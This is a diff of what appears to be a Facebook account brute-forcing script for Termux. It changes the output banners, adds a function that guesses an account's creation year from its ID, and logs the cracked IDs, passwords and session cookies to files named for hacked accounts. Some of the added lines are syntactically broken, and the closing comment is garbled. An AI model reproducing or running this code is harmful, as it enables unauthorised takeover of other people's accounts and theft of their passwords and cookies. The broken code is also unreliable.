@@ -2022,17 +2022,15 @@ def checker(idf, pwv, index):
 			sys.stdout.flush()
 			if 'checkpoint' in response.url:
 				cp+=1
-				print(f'\r\033[1;91m└──[𝙶𝚊𝚖𝚘𝚞𝚍𝚒-𝐂𝐏] {idf} | {ps}	  \n 𝐋𝐈𝐍𝐊 = https://www.facebook.com/profile.php?id={idf}\n  ')	
+				print(f'\r\033[1;91m└──[✵>𝚁𝚎𝚊𝚕𝚒𝚝𝚢 𝚟𝚒𝚕𝚕𝚊𝚒𝚗𝚜-𝐂𝐏] {idf} | {ps}	  \n♻️تاريخ إنشاء الحساب -└──>  :{tahun(idf)}\n')
 				os.system('espeak -a 300 "  Cp,  Id  "')
-				open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤/فيسبوك-حسابات Ok-CP/حسابات-CP.txt','a').write(idf+'|'+ps+'\n')
+				open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤/فيسبوك-حسابات Ok-CP/حسابات-CP.txt','a').write(idf+'|'+ps+'|'+{tahun(idf)}'\n')
 			elif 'c_user' in r.cookies.get_dict():
 				ok+=1
 				coki=r.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
-				print(f'\r\033\n\n[38;5;48m					 \n\n   🆔 :|	 {idf}	   🔑 :|	 {ps} \n \n\033[0;96m[🌐]= 𝙲𝙾𝙾𝙺𝙸𝙴𝚂└──> \033[38;5;48m{kuki} \n𝐋𝐈𝐍𝐊 = https://www.facebook.com/profile.php?id={idf}\n')
-				
-				os.system('espeak -a 300 " Rayen Gamoudi ,Facebook ,  Ok,  id  "')
-				open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤/فيسبوك-حسابات Ok-CP/حسابات-OK.txt','a').write(idf+'|'+ps+'|'+kuki+'\n\n')
+				print(f'\r\033[1;92m└──[✵>𝚁𝚎𝚊𝚕𝚒𝚝𝚢 𝚟𝚒𝚕𝚕𝚊𝚒𝚗𝚜-𝐎𝐊]  🆔 :|	 {idf}	   🔑 :|	 {ps} \n \n\033[0;96m[🌐]= 𝙲𝙾𝙾𝙺𝙸𝙴𝚂└──> \033[38;5;48m{kuki} \n♻️تاريخ إنشاء الحساب -└──>  :{tahun(idf)}\n')
+				open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤/فيسبوك-حسابات Ok-CP/حسابات-OK.txt','a').write(idf+'|'+ps+'|'+kuki+'|'+{tahun(idf)}+'\n\n')
 				open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤/فيسبوك-حسابات Ok-CP/حسابات-rOK.txt','a').write(idf+'|'+ps+'\n')
 			else:
 				continue
@@ -2593,7 +2591,34 @@ class Brute:
                time.sleep(10) ; self.api_vjs2(user, password, allData_akun, file='data/termux/internal/')
         self.lp +=1
 
-
+def tahun(fx):
+        if len(fx)==15:
+                if fx[:10] in ['1000000000']       :tahunz = '2009'
+                elif fx[:9] in ['100000000']       :tahunz = '2009'
+                elif fx[:8] in ['10000000']        :tahunz = '2009'
+                elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
+                elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
+                elif fx[:6] in ['100001']          :tahunz = '2010-2011'
+                elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
+                elif fx[:6] in ['100004']          :tahunz = '2012-2013'
+                elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
+                elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
+                elif fx[:6] in ['100009']          :tahunz = '2015'
+                elif fx[:5] in ['10001']           :tahunz = '2015-2016'
+                elif fx[:5] in ['10002']           :tahunz = '2016-2017'
+                elif fx[:5] in ['10003']           :tahunz = '2018'
+                elif fx[:5] in ['10004']           :tahunz = '2019'
+                elif fx[:5] in ['10005']           :tahunz = '2020'
+                elif fx[:5] in ['10006','10007','10008','10009','100010','100011','100012']:tahunz = '2021-2022'
+                else:tahunz=''
+        elif len(fx) in [9,10]:
+                tahunz = '2008-2009'
+        elif len(fx)==8:
+                tahunz = '2007-2008'
+        elif len(fx)==7:
+                tahunz = '2006-2007'
+        else:tahunz=''
+        return tahunz		
 if __name__ == "__main__":
     try:
         # تحديد المسارات
@@ -2663,4 +2688,4 @@ if __name__ == "__main__":
     brute = Brute()  # كائن من الفئة Brute
     Menu()           # عرض القاjئnnمjjة أو nتنفيذ الخياراتgh
     
-    #bhgوتyyyتتتتناتتjjhmnhhhyاتتاااbنh,😙𝚑𝚑😋gbتتتااhj𝐡𝐡
+    #bhgوتyyyتتتتناتتjjhmnhhhyاتتاااbنh,😙ت𝚑𝚑😋gbتتتااhj𝐡𝐡
